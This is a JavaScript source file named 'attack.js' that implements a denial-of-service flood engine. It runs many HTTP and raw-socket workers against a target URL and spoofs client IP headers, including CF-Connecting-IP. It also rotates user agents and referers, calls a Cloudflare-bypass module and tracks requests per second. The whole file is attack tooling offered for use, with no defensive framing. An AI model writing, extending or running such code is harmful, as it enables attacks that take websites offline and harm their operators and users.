// attack.js - Main Attack Engine with Full Customization
const https = require('https');
const http = require('http');
const net = require('net');
const tls = require('tls');
const url = require('url');
const IP_LIST = require('./ip-list');
const USER_AGENTS = require('./user-agents');
const REFERERS = require('./referers');
const CF_BYPASS = require('./cf-bypass');

class AttackEngine {
    constructor() {
        this.isAttacking = false;
        this.stats = {
            total: 0,
            success: 0,
            failed: 0,
            cfBypassed: 0
        };
        this.workers = [];
        this.targetRequests = 0;
        this.duration = 0;
        this.startTime = 0;
    }

    async start(target, threads, duration, targetRequests, callback) {
        this.isAttacking = true;
        this.target = target;
        this.callback = callback;
        this.duration = duration * 1000;
        this.targetRequests = targetRequests;
        
        const parsed = new URL(target);
        this.hostname = parsed.hostname;
        this.port = parsed.port || (parsed.protocol === 'https:' ? 443 : 80);
        this.protocol = parsed.protocol;
        this.path = parsed.pathname + parsed.search;
        
        this.startTime = Date.now();
        
        console.log(`[+] Attack started on ${target}`);
        console.log(`[+] Threads: ${threads}, Duration: ${duration}s, Target Req: ${targetRequests}`);
        
        // Start HTTP/S workers (70%)
        const httpThreads = Math.floor(threads * 0.7);
        for (let i = 0; i < httpThreads; i++) {
            this.startHttpWorker();
        }
        
        // Start Socket workers (30%)
        const socketThreads = threads - httpThreads;
        for (let i = 0; i < socketThreads; i++) {
            this.startSocketWorker();
        }
        
        // Monitor
        this.monitor();
    }

    stop() {
        this.isAttacking = false;
    }

    startHttpWorker() {
        const worker = () => {
            while (this.isAttacking && this.checkLimits()) {
                this.sendHttpRequest();
            }
        };
        
        // Multiple instances per worker
        for (let i = 0; i < 10; i++) {
            setImmediate(worker);
        }
    }

    startSocketWorker() {
        const worker = () => {
            while (this.isAttacking && this.checkLimits()) {
                this.sendSocketRequest();
            }
        };
        
        for (let i = 0; i < 10; i++) {
            setImmediate(worker);
        }
    }

    sendHttpRequest() {
        try {
            const ip = IP_LIST[Math.floor(Math.random() * IP_LIST.length)];
            const ua = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
            const referer = REFERERS[Math.floor(Math.random() * REFERERS.length)];
            
            const headers = CF_BYPASS.getHeaders(ip, ua, referer);
            
            const options = {
                hostname: this.hostname,
                port: this.port,
                path: this.path + (this.path.includes('?') ? '&' : '?') + `_=${Date.now()}`,
                method: Math.random() > 0.5 ? 'GET' : 'POST',
                headers: headers,
                timeout: 2000,
                rejectUnauthorized: false
            };
            
            const req = (this.protocol === 'https:' ? https : http).request(options, (res) => {
                this.stats.total++;
                if (res.statusCode === 200) {
                    this.stats.success++;
                    this.stats.cfBypassed++;
                } else if (res.statusCode < 500) {
                    this.stats.success++;
                } else {
                    this.stats.failed++;
                }
                res.destroy();
            });
            
            req.on('error', () => {
                this.stats.total++;
                this.stats.failed++;
            });
            
            req.on('timeout', () => {
                req.destroy();
                this.stats.total++;
            });
            
            if (options.method === 'POST') {
                req.write(JSON.stringify({
                    _: Date.now(),
                    r: Math.random(),
                    t: Date.now()
                }));
            }
            
            req.end();
            
        } catch (e) {
            this.stats.total++;
            this.stats.failed++;
        }
    }

    sendSocketRequest() {
        try {
            const ip = IP_LIST[Math.floor(Math.random() * IP_LIST.length)];
            const ua = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
            const referer = REFERERS[Math.floor(Math.random() * REFERERS.length)];
            
            const socket = new net.Socket();
            socket.setTimeout(1000);
            
            socket.connect(this.port, this.hostname, () => {
                if (this.protocol === 'https:') {
                    const tlsSocket = tls.connect({
                        socket: socket,
                        host: this.hostname,
                        rejectUnauthorized: false
                    }, () => {
                        const request = [
                            `GET ${this.path} HTTP/1.1`,
                            `Host: ${this.hostname}`,
                            `User-Agent: ${ua}`,
                            `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`,
                            `Accept-Language: en-US,en;q=0.9`,
                            `Connection: close`,
                            `X-Forwarded-For: ${ip}`,
                            `CF-Connecting-IP: ${ip}`,
                            `Referer: ${referer}`,
                            ``
                        ].join('\r\n');
                        
                        tlsSocket.write(request);
                        this.stats.total++;
                        this.stats.success++;
                    });
                    
                    tlsSocket.on('error', () => {
                        this.stats.total++;
                        this.stats.failed++;
                    });
                    
                } else {
                    const request = [
                        `GET ${this.path} HTTP/1.1`,
                        `Host: ${this.hostname}`,
                        `User-Agent: ${ua}`,
                        `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`,
                        `Connection: close`,
                        `X-Forwarded-For: ${ip}`,
                        `Referer: ${referer}`,
                        ``
                    ].join('\r\n');
                    
                    socket.write(request);
                    this.stats.total++;
                    this.stats.success++;
                }
            });
            
            socket.on('error', () => {
                this.stats.total++;
                this.stats.failed++;
            });
            
            socket.on('timeout', () => {
                socket.destroy();
            });
            
        } catch (e) {
            this.stats.total++;
            this.stats.failed++;
        }
    }

    checkLimits() {
        // Check duration limit
        if (this.duration > 0) {
            const elapsed = Date.now() - this.startTime;
            if (elapsed >= this.duration) {
                this.isAttacking = false;
                return false;
            }
        }
        
        // Check target requests limit
        if (this.targetRequests > 0 && this.stats.total >= this.targetRequests) {
            this.isAttacking = false;
            return false;
        }
        
        return true;
    }

    monitor() {
        const interval = setInterval(() => {
            if (!this.isAttacking) {
                clearInterval(interval);
                
                const elapsed = (Date.now() - this.startTime) / 1000;
                const avgRPS = Math.round(this.stats.total / elapsed);
                
                const report = {
                    total: this.stats.total,
                    success: this.stats.success,
                    failed: this.stats.failed,
                    cfBypassed: this.stats.cfBypassed,
                    elapsed: elapsed.toFixed(1),
                    rps: avgRPS
                };
                
                if (this.callback) {
                    this.callback(report);
                }
                
                return;
            }
            
            const elapsed = (Date.now() - this.startTime) / 1000;
            const currentRPS = Math.round(this.stats.total / elapsed);
            
            const progress = {
                total: this.stats.total,
                success: this.stats.success,
                failed: this.stats.failed,
                cfBypassed: this.stats.cfBypassed,
                elapsed: elapsed.toFixed(1),
                rps: currentRPS
            };
            
            if (this.callback) {
                this.callback(progress);
            }
            
        }, 500);
    }
}

module.exports = AttackEngine;
